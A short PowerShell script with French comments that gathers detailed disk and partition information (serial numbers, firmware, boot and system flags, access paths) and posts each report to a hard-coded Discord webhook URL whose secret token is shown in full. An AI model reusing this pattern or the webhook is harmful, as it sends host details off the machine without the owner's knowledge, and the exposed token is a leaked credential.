# Récupération de la liste des disques présents sur le système
$disks = Get-Disk

# Boucle à travers chaque disque trouvé
foreach ($disk in $disks) {
    # Numéro du disque actuel
    $diskNumber = $disk.Number
    
    # Récupération des informations détaillées sur le disque
    $diskInfo = Get-Disk -Number $diskNumber | Select-Object -Property Model,SerialNumber,MediaType,InterfaceType,Size,PartitionStyle,NumberOfPartitions,OperationalStatus,HealthStatus,FirmwareVersion,LogicalSectorSize,PhysicalSectorSize,IsBoot,IsSystem,IsReadOnly,IsOffline,IsClustered
    
    # Initialisation de la variable de sortie avec le numéro de disque
    $output = "Disk: $($disk.Number)`n"
    
    # Boucle à travers chaque propriété des informations du disque
    foreach ($prop in $diskInfo.PSObject.Properties) {
        # Ajout de chaque propriété à la variable de sortie
        $output += "`n$($prop.Name): $($prop.Value)`n"
    }
    
    # Récupération des partitions du disque actuel
    $partitions = Get-Partition -DiskNumber $diskNumber
    
    # Boucle à travers chaque partition du disque actuel
    foreach ($partition in $partitions) {
        # Récupération des informations détaillées sur la partition
        $partitionInfo = $partition | Select-Object -Property PartitionNumber,Size,AccessPaths,IsSystem,IsActive,IsBoot,IsReadOnly,IsShadowCopy
        
        # Ajout des informations de la partition à la variable de sortie
        $output += "`n  Partition: $($partitionInfo.PartitionNumber)`n    Size: $($partitionInfo.Size)`n    AccessPaths: $($partitionInfo.AccessPaths)`n    IsSystem: $($partitionInfo.IsSystem)`n    IsActive: $($partitionInfo.IsActive)`n    IsBoot: $($partitionInfo.IsBoot)`n    IsReadOnly: $($partitionInfo.IsReadOnly)`n    IsShadowCopy: $($partitionInfo.IsShadowCopy)`n"
    }
    
    # Envoi des informations au webhook Discord
    Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1205201878149890109/LPUyPL-CvUOWarFOqBNoiydFrTCF2v3ip5tWQppaaEMPWEBa6T1h0q3a7S4CvMkKXEwp' -Method Post -Body @{content=$output}
}
